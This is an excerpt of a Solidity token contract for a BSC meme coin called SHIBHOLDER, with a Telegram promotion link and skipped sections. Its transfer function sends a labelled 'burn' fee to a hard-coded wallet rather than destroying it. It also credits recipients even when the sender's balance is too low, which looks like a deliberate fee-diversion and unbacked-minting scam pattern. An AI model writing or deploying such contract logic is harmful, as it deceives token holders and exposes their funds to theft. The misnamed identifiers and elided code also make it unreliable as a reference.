...
// Submitted for Telegram: https://t.me/shibholderbsc
...
contract  SHIBHOLDER  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "SHIBHOLDER";
    string private _symbol = "SHIBHOLDER";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x7EF78ab2DB829DDf676F4b3C78072EfEC3D63C56] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x7EF78ab2DB829DDf676F4b3C78072EfEC3D63C56, _bruntoken);
        }
